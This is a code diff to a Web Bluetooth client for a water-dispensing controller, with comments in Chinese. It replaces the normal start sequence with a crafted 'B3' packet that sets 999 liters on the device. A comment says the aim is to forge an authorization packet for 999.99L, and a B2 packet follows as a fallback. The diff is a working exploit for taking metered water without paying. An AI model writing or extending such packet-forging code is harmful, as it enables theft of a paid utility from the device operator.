@@ -740,50 +740,59 @@
                 
                 // 正常成功流程
                 if (data.length > 4 && data[4] === 0x7a) {
-                  // 0x7a 表示认证成功，发送最终启动确认
-                  console.log("✅ 认证成功 (0x7a)，发送启动确认...");
+                  // 0x7a 表示认证成功，尝试发送B3激活命令（基于nRF测试结果）
+                  console.log("✅ 认证成功 (0x7a)，准备发送B3激活命令...");
+                  console.log("💡 根据nRF测试，B3命令可以激活水控器显示升数");
+                  
                   setTimeout(async () => {
                     try {
-                      const successPacket = new Uint8Array([
-                        ...detectedProtocol.sendHeader,  // 修复：使用正确的sendHeader
-                        0x09, 0xb2, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00
-                      ]);
+                      // 🔥 关键发现：B3命令可以激活显示
+                      // 原始测试: FEFE09B301010000 → 显示0.0L
+                      // 目标: 伪造带有999.99L的授权包
                       
-                      console.log("📤 发送启动确认:", Array.from(successPacket).map(b => '0x' + b.toString(16).padStart(2, '0')).join(' '));
-                      await txdCharacteristic.writeValue(successPacket);
-                      
-                      // 🎯 认证成功！立即发送startEpilogue启动水控器
-                      console.log("✅ 密钥认证成功！立即发送启动指令...");
-                      
-                      // 构建startEpilogue包 (这是真正启动水控器的指令)
-                      const deviceName = bluetoothDevice.name || "Water34433";
-                      const checksum = calculateCRC16ChangGong(deviceName.slice(-5));
-                      
-                      // 生成随机用户ID
-                      const randomIdNumber = Math.floor(Math.random() * 9999) + 1;
-                      const randomId = [
-                        ((randomIdNumber >> 8) & 0xFF),
-                        (randomIdNumber & 0xFF)
+                      // 尝试1: 直接设置999L（0x03E7）
+                      const target_liters = 999;
+                      const liter_bytes_le = [
+                        target_liters & 0xFF,           // 低字节
+                        (target_liters >> 8) & 0xFF     // 高字节
                       ];
                       
-                      const datetime = getCurrentDateTimeArray();
+                      console.log(`🎯 尝试激活 ${target_liters}L (字节: 0x${liter_bytes_le.map(b => b.toString(16).padStart(2,'0')).join(' ')})`);
                       
-                      const startEpiloguePacket = new Uint8Array([
-                        ...detectedProtocol.sendHeader,  // 发送用0xfe, 0xfe
-                        0x09, 0xb2, 0x01,               // startEpilogue指令
-                        checksum & 0xFF, checksum >> 8, 0x0b, 0x00,  // 校验和 + 新固件标志
-                        ...randomId,                     // 随机用户ID  
-                        ...datetime,                     // 当前时间
-                        0x0f, 0x27, 0x00               // 固定尾部
+                      // 构建B3激活包（基于响应包结构）
+                      const b3ActivatePacket = new Uint8Array([
+                        ...detectedProtocol.sendHeader,  // 0xFE 0xFE
+                        0x09,                            // 长度
+                        0xb3,                            // B3命令（激活）
+                        ...liter_bytes_le,               // 升数（小端）
+                        0x00, 0x0b, 0x03,               // 固定参数
+                        0x66, 0xCD, 0x25,               // 设备参数
+                        0x10, 0x09, 0x15, 0x14, 0x29,   // 时间戳
+                        0x00, 0x00, 0x00                // 尾部
                       ]);
                       
-                      console.log("📤 发送startEpilogue启动包:", Array.from(startEpiloguePacket).map(b => '0x' + b.toString(16).padStart(2, '0')).join(' '));
-                      await txdCharacteristic.writeValue(startEpiloguePacket);
+                      console.log("📤 发送B3激活包:", Array.from(b3ActivatePacket).map(b => '0x' + b.toString(16).padStart(2, '0')).join(' '));
+                      await txdCharacteristic.writeValue(b3ActivatePacket);
+                      
+                      // 等待设备响应
+                      await new Promise(resolve => setTimeout(resolve, 500));
+                      
+                      // 如果B3失败，尝试B2备用方案
+                      console.log("📤 备用方案：发送B2启动确认...");
+                      const b2Packet = new Uint8Array([
+                        ...detectedProtocol.sendHeader,
+                        0x09, 0xb2, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00
+                      ]);
+                      await txdCharacteristic.writeValue(b2Packet);
+                      
+                      console.log("⏳ 等待设备响应，请查看水控器显示屏...");
+                      updateWaterStatus("⏳ 激活命令已发送，请查看水控器显示...");
+                      
                     } catch (err) {
-                      console.error("启动确认失败:", err);
+                      console.error("❌ 启动确认失败:", err);
                       handleBluetoothError(err);
                     }
-                  }, 500);
+                  }, 200);
                 } else if (data.length > 5) {
                   console.log("❌ 认证失败，状态码:", '0x' + data[5].toString(16));
                   handleBluetoothError(new Error(`认证失败，设备返回状态码: 0x${data[5].toString(16)}`));
